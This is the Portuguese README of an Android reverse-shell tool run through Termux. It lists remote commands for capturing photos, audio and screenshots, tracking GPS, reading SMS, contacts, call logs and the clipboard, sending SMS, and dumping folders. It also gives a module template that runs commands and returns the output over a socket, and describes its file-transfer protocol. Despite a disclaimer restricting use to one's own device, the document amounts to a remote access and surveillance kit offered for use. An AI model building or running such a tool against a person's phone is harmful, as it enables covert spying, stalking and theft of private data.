# TermuxSpectre

Reverse shell modular para Android via Termux. Cada comando especial é um
módulo em `modules/`, carregado automaticamente.

> ⚠️ Uso exclusivamente didático e pessoal. Roda no próprio dispositivo,
> em rede local, com autorização. Usar em dispositivo de terceiros sem
> consentimento é crime (Art. 154-A, Lei 14.155/2021).

---

## Estrutura

TermuxSpectre/
├── main.py
├── recv.py
├── config/settings.py
├── core/shell.py
└── modules/
    ├── __init__.py
    └── (um arquivo por comando)

---

## Instalação

pkg update && pkg upgrade
pkg install python termux-api

Instale o app Termux:API (F-Droid ou Play Store) e abra uma vez.

---

## Uso

Terminal 1:
python recv.py

Terminal 2:
python main.py

No terminal do recv.py, digite /help.

---

## Comandos

### Sistema
- /system — modelo, Android, kernel, uptime, armazenamento
- /battery — bateria formatada
- /info sensor [nome] — lista ou lê sensor
- /info device — operadora, SIM, rede
- /info cell — torres de celular
- /apps [filtro] — lista apps instalados

### Rede
- /wifi — SSID, IP, sinal, frequência
- /lan arp — tabela ARP
- /lan ping [faixa] — ping sweep (~30s)
- /lan portas <ip> — testa portas comuns
- /who all — IP + MAC + fabricante
- /who <ip> — detalhes de um IP

### Hardware
- /photo — foto da câmera (JPEG)
- /mic [seg] — grava áudio (.m4a)
- /screenshot — captura de tela (PNG)
- /torch on|off|blink — lanterna
- /vibrate [ms] — vibração
- /bright [0-255] — brilho
- /volume — lista volumes
- /volume <stream> <0-15> — ajusta volume

### Localização
- /gps [gps|network|passive] — localização

### Comunicação
- /phone call <num> — disca
- /phone sms <num> <txt> — envia SMS
- /phone contacts — lista contatos
- /phone logs [n] — chamadas recentes
- /phone inbox [n] — SMS recebidos
- /phone cell — torres
- /notification <t> | <txt> — notificação
- /speak <texto> — TTS
- /dialog <tipo> — diálogo (text, confirm, radio, spinner, date, time)

### Arquivos
- /dump [pasta] — compacta e envia pasta
- /transfer up <arq> — envia arquivo
- /transfer down <url> <dst> — baixa da internet
- /clip — lê clipboard
- /clip <texto> — escreve clipboard

### Mídia
- /media play <arq> — toca áudio/vídeo
- /media stop|pause|info — controla player
- /media open <arq> — abre no player padrão
- /open <url|app|arq> — abre site/app/arquivo

### Controle
- /reboot — reinicia (requer root)
- /help — lista comandos

---

## Criar módulo novo

Arquivo modules/meu.py:

import subprocess

NAME = "/meu"
DESC = "descricao"


def run(shell, args):
    try:
        p = subprocess.run(
            ["binario", *args.split()],
            capture_output=True, text=True,
            timeout=10, stdin=subprocess.DEVNULL,
        )
        out = p.stdout if p.returncode == 0 else p.stderr
    except FileNotFoundError:
        out = "erro: binario nao instalado"
    except subprocess.TimeoutExpired:
        out = "erro: timeout"
    except Exception as e:
        out = f"erro: {e}"
    if not out.endswith("\n"):
        out += "\n"
    shell.socket.send(out.encode())

Reinicia o main.py e o /help já mostra o novo comando.

---

## Protocolo binário

FILE <nome> <tamanho>
<bytes crus>

recv.py lê o header, espera exatamente tamanho bytes, salva e volta a ler
texto. nc puro mostra lixo — por isso recv.py é obrigatório pra /photo,
/mic, /screenshot, /dump e /transfer up.

---

## Permissões

- /wifi, /gps, /cell — Localização
- /photo, /torch — Câmera
- /mic — Microfone
- /phone inbox — SMS
- /bright — Modificar configurações
- /dump, /transfer — Armazenamento (termux-setup-storage)

Configurações → Apps → Termux:API → Permissões.

---

## Limitações

- /reboot requer root
- /lan arp pode vir vazio no Android 10+
- /clip sem argumento pode falhar no Android 10+
- /phone inbox pode ser bloqueado pelo Google
- /screenshot sai preta com DRM ativo (Netflix, banco)

---

## Padrões do projeto

- Todo subprocess usa stdin=subprocess.DEVNULL e timeout=10
- Binário enviado com FILE <nome> <tamanho>
- Módulos carregados via pkgutil + importlib
- Cor ANSI pura, sem colorama
- Um arquivo por comando, sem comentários
